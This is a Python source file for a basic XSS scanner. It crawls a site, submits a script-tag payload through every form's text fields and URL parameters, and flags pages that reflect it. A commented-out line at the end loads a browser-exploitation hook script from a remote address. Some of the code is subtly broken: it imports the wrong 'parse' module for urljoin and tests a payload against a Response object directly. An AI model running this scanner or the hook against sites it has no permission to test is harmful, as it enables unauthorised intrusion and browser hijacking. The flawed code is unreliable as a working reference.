import requests
from bs4 import BeautifulSoup
# from urllib import parse
import logging
import os
import parse
from concurrent.futures import ThreadPoolExecutor

class Scanner:

    def __init__(self, url, links_to_ignore=[]):
        self.session = requests.Session()
        self.target_url = url
        self.ignored_links = links_to_ignore
        self.target_links = set()
        self.target_links.add(self.target_url)
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def extract_links(self, url):
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            return [link['href'] for link in links]
        except Exception as e:
            self.logger.error(f"Error extracting links from {url}: {str(e)}")
            return []

    def extract_forms(self, url):
        try:
            response = self.session.get(url)
            parsed_html = BeautifulSoup(response.text, 'html.parser')
            return parsed_html.find_all('form')
        except Exception as e:
            self.logger.error(f'Error extracting form from {url}: {str(e)}')
            return []
    
    def submit_form(self, form, value, url):
        try:
            action = form.get('action')
            req_url = parse.urljoin(url, action)
            method = form.get('method')

            input_lists = form.find_all('input')
            req_data = {}
            for input in input_lists:
                input_name = input.get('name')
                input_type = input.get('type')
                input_value = input.get('value')
                if input_type=='text':
                    input_value = value
                req_data[input_name] = input_value
            req_data['login']='submit'
            if method=='post':
                return self.session.post(req_url, data=req_data)
            else:
                return self.session.get(req_url, params=req_data)
            
        except Exception as e:
            return f'Error submitting form for {url}: {str(e)}'

    def test_xss_in_form(self, form, url):
        payload = b'<sCript>alert("Testing XSS")</scRipt>'
        response = self.submit_form(form, payload.decode('utf-8'), url)

        if f'Error submitting form for {url}' in response:
            self.logger.error(f'[-] Error testing xss in form for {url}')
            self.logger.error(response)
            raise Exception

        return payload in response.content
    
    def test_xss_in_url(self, url):
        try:
            payload = b'<sCript>alert("Testing XSS")</scRipt>'
            url = url.replace('=', '='+payload.decode('utf-8'))
            response = self.session.get(url)
        except Exception as e:
            self.logger.error(f'[-] Error testing XSS in url for {url}')
            raise Exception

        return payload in response

    def crawl(self, url=None):
        if url is None:
            url = self.target_url

        links_to_process = [url]
        seen_links = set()  
        links_to_write = []  

        while links_to_process:
            curr_link = links_to_process.pop()

            if curr_link not in seen_links:
                try:
                    href_links = self.extract_links(curr_link)
                    seen_links.add(curr_link)
                    self.logger.info(curr_link)

                    links_to_process.extend(
                        parse.urljoin(curr_link, link) for link in href_links
                        if self.target_url in link and '#' not in link
                    )

                    links_to_write.append(curr_link)

                except Exception as e:
                    self.logger.error(f"Error processing {curr_link}: {e}")

            if len(links_to_write) >= 100:
                with open('links.txt', 'a') as f:
                    f.writelines(f"{link}\n" for link in links_to_write)
                    links_to_write.clear()


    def start(self):
        if os.path.isfile('links.txt'):
            os.remove('links.txt')
        self.crawl()

    def run_scanner(self):
        with open('links.txt', 'r') as f:
            links = f.readlines()
        for curr_link in links:
            link = curr_link.strip('\n')
            forms = self.extract_forms(link)
            for form in forms:
                self.logger.info(f'[+] Testing form in link: {link}')
                try:
                    is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                    if is_vulnerable_to_xss:
                        self.logger.warning(f'[***] XSS discovered in {link} in the following form\n{form}')
                    else:
                        self.logger.info('     --> Form is safe')
                except:
                    pass

            if '=' in link:
                self.logger.info(f'[+] Testing link: {link}')
                try:
                    is_vulnerable_to_xss = self.test_xss_in_url(link)
                    if is_vulnerable_to_xss:
                        self.logger.warning(f'[***] Discovered XSS in {link}')
                    else:
                        self.logger.info('     --> URL is safe')
                except:
                    pass
        



# <script src="http://192.168.56.101:3000/hook.js"></script>


